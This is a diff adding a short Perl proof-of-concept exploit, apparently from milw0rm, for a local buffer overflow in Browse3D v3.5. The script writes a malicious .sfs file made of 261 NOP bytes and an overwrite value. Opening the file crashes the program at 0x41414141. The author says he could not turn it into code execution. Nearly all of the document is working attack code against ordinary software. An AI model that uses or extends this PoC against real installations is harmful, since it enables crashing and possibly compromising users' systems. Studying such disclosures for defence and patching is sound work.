@@ -1,0 +1,34 @@
+#!/usr/bin/perl -w
+
+# -- Viva Gazza -- Viva Palestine --
+
+# Browse3D v3.5 (.sfs) File Local Buffer overflow PoC
+# http://www.browse3d.com/downloads/Browse3Dsetup.exe
+
+# Author : Houssamix
+
+# create file exploit > open it > 
+# Error : Access violation at 0x41414141 ( tried to read from 0x41414141 ), program terminated.
+
+# we can't run this program under the debugger !!! any way i think it's can be exploited . good luck !
+
+print "===================================================================== \n";
+print "Author : Houssamix 						    \n";
+print "===================================================================== \n";
+print "Browse3D v3.5 Local Buffer overflow PoC				  \n";
+print "===================================================================== \n";
+
+my $adresse = "AAAA" ; 
+my $nop = "\x90" x 261;
+
+my $file = "Houssamix.sfs";
+$exploit = $nop.$adresse;
+
+open(my $FILE, ">>$file") or die "Cannot open $file: $!";
+print $FILE $exploit ;
+
+
+close($FILE);
+print "$file has been created open it  with Browse3D v 3.5\n";
+
+# milw0rm.com [2009-01-11]
